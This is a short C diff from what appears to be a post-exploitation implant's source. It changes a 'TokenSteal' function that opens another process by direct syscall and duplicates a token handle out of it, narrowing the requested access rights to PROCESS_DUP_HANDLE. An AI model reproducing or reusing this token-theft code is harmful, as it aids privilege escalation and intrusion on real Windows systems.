@@ -126,7 +126,7 @@ HANDLE TokenSteal( DWORD ProcessID, HANDLE TargetHandle )
     {
         PRINTF( "Stealing handle 0x%x from PID %d\n", TargetHandle, ProcessID );
         ProcID.UniqueProcess = ProcessID;
-        NtStatus = Instance.Syscall.NtOpenProcess( &hProcess, MAXIMUM_ALLOWED, &ObjAttr, &ProcID );
+        NtStatus = Instance.Syscall.NtOpenProcess( &hProcess, PROCESS_DUP_HANDLE, &ObjAttr, &ProcID );
         if ( NT_SUCCESS( NtStatus ) )
         {
             NtStatus = Instance.Syscall.NtDuplicateObject( hProcess, TargetHandle, NtCurrentProcess( ), &hTokenDup, 0, 0, DUPLICATE_SAME_ACCESS );
